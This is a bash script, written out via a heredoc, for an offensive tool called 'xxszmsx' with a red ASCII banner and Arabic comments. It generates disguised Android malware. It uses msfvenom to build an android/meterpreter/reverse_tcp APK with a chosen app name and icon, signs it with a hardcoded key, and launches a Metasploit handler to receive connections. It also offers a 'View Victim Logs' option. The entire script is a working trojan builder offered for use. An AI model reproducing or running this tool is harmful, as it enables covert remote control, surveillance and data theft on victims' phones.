cat << 'EOF' > ~/xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: xxszmsx ULTRA (PRO MAX EDITION v90.0)
# STATUS: PROFESSIONAL INTERFACE & SIGNATURE
# =====================================================

# تعريف الألوان الدموية (ANSI Colors)
RED='\033[0;31m'
BRED='\033[1;31m'
GREY='\033[1;30m'
NC='\033[0m' # No Color

# مسارات النظام
SAVE_DIR="$HOME/Downloads"
DB_FILE="$HOME/.xx_db"
touch $DB_FILE

# دالة رسم الإطار العلوي والشعار الكبير
draw_ui() {
    clear
    echo -e "${BRED}┌──────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BRED}│${NC}  ${RED} ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗ ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED} ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝ ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED}  ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝  ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED}  ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗  ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED} ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗ ${BRED}│${NC}"
    echo -e "${BRED}│${NC}  ${RED} ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ${BRED}│${NC}"
    echo -e "${BRED}├──────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BRED}│${NC}  ${RED}OWNER: MAZEN & FRIEND${NC}        ${RED}STATUS: ACTIVE [PRO MAX]${NC}     ${BRED}│${NC}"
    echo -e "${BRED}└──────────────────────────────────────────────────────────┘${NC}"
}

check_deps() {
    for pkg in msfvenom apksigner keytool python3; do
        if ! command -v $pkg &> /dev/null; then
            echo -e "${RED}[!] Dependency $pkg is missing. Installing...${NC}"
            sudo apt update && sudo apt install metasploit-framework openjdk-17-jdk apksig python3 -y &> /dev/null
        fi
    done
}

main_menu() {
    while true; do
        draw_ui
        echo -e "  ${BRED}[${NC}${RED}1${NC}${BRED}]${NC} ${RED}Build Stealth APK (With Icon & Name)${NC}"
        echo -e "  ${BRED}[${NC}${RED}2${NC}${BRED}]${NC} ${RED}Start Control Center (Listener)${NC}"
        echo -e "  ${BRED}[${NC}${RED}3${NC}${BRED}]${NC} ${RED}View Victim Logs${NC}"
        echo -e "  ${BRED}[${NC}${RED}0${NC}${BRED}]${NC} ${RED}Kill System${NC}"
        echo -e "${GREY}  ----------------------------------------------------------${NC}"
        echo -n -e "  ${BRED}xxszmsx@kali${NC}:${RED}~#${NC} "
        read choice

        case $choice in
            1) build_apk ;;
            2) start_listener ;;
            3) view_logs ;;
            0) exit 0 ;;
            *) echo -e "${RED}Invalid!${NC}"; sleep 1 ;;
        esac
    done
}

build_apk() {
    draw_ui
    echo -e "${RED}[†] Preparing Icon & Payload Structure...${NC}"
    
    # تحقق من وجود الأيقونة
    if [ ! -f "$HOME/icon.png" ]; then
        echo -e "${RED}[✘] Error: /home/kali/icon.png not found!${NC}"
        read -p "Press Enter to return..."
        return
    fi

    # قراءة البيانات من القاعدة لو وجدت
    if [ -f "$DB_FILE" ]; then
        LAST_HOST=$(cut -d'|' -f1 $DB_FILE)
        LAST_PORT=$(cut -d'|' -f2 $DB_FILE)
        echo -e "${GREY}[Info] Last IP: $LAST_HOST | Port: $LAST_PORT${NC}"
    fi

    read -p "[+] App Name: " app_name
    read -p "[+] LHOST (Default: $LAST_HOST): " lh; lh=${lh:-$LAST_HOST}
    read -p "[+] LPORT (Default: $LAST_PORT): " lp; lp=${lp:-$LAST_PORT}
    
    # حفظ الإعدادات للمرة القادمة
    echo "$lh|$lp" > "$DB_FILE"

    echo -e "${RED}[*] Injecting Shelcode & Building Payload with Icon...${NC}"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R --icon /home/kali/icon.png -o "temp.apk" &> /dev/null

    echo -e "${RED}[*] Signing APK with Pro Max Key (Schema V2/V3)...${NC}"
    # إنشاء مفتاح توقيع خاص بالأداة (مرة واحدة)
    if [ ! -f "mazen.keystore" ]; then
        keytool -genkey -v -keystore mazen.keystore -alias mazen -keyalg RSA -keysize 2048 -validity 10000 -storepass blood123 -keypass blood123 -dname "CN=xxszmsx, OU=H, O=B, L=KW, S=AH, C=KW" &> /dev/null
    fi
    
    apksigner sign --ks mazen.keystore --ks-pass pass:blood123 --out "$SAVE_DIR/$app_name.apk" temp.apk &> /dev/null

    rm temp.apk
    echo -e "${BRED}=======================================${NC}"
    echo -e "${BRED}✔ SUCCESS: $app_name.apk with ICON created!${NC}"
    echo -e "${BRED}✔ Path: /home/kali/Downloads/${NC}"
    echo -e "${BRED}=======================================${NC}"
    read -p "Press Enter to return..."
}

start_listener() {
    clear
    read -p "Enter Port to Listen on: " lp
    echo -e "${RED}[*] Starting Control Center on Port $lp...${NC}"
    msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport $lp; exploit -j"
}

check_deps
main_menu
EOF

chmod +x ~/xxszmsx.sh
